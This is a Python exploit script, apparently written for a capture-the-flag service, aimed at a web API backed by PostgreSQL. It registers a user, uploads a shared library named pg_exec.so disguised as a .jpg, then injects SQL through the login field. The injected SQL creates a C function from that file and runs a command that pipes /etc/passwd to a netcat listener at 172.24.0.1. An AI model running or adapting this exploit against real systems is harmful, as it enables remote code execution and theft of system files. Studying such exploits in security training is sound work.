#!/usr/bin/env python3.9

import sys
import requests
import uuid
import hashlib
import random
import string
import os
from requests import Request, Session


def get_sha256(s):
    return hashlib.sha256(s.encode('utf-8')).hexdigest()


def generate_some_flag():
    # [0-9A-Z]{31}=
    flag = []
    for i in range(31):
        flag.append(random.choice(string.digits + string.ascii_uppercase))
    flag.append('=')

    return ''.join(flag)


def main(host):
    login = str(uuid.uuid4())
    password_hash = get_sha256(str(uuid.uuid4()))
    flag = generate_some_flag()

    with requests.post(f'http://{host}/api/users',
                       json={
                           'login': login,
                           'password_hash': password_hash,
                           'credit_card_info': flag
                       }) as r:
        if r.status_code != 201:
            print('host down')
            exit(1)

        auth, id_ = r.json()["auth_cookie"], r.json()["id"]

    print('created user', auth, id_)

    fname = f'laptop1{str(uuid.uuid4())}.jpg'
    path, name = os.path.dirname(os.path.realpath(__file__)) + '/pg_exec.so', fname
    with open(path, 'rb') as f:
        data = f.read()

    with requests.post(f'http://{host}/api/images',
                  cookies={'5GAuth': auth},
                  files={name: data}) as r:
        execpath = str(r.json()["path"]).lstrip('/api/images/get/')
        print(execpath)

    with requests.put(f'http://{host}/api/users/auth',
                      json={
                          'login': f'\' or 1=1 limit 1; CREATE FUNCTION sys2(cstring) RETURNS int AS \'./{execpath}\', \'pg_exec\' LANGUAGE C STRICT; SELECT sys2(\'cat /etc/passwd | nc 172.24.0.1 1488\'); --',
                          'password_hash': 'fdfdfdfdf'
                      }) as r:
        print(r, r.content)


if __name__ == '__main__':
    main(sys.argv[1])
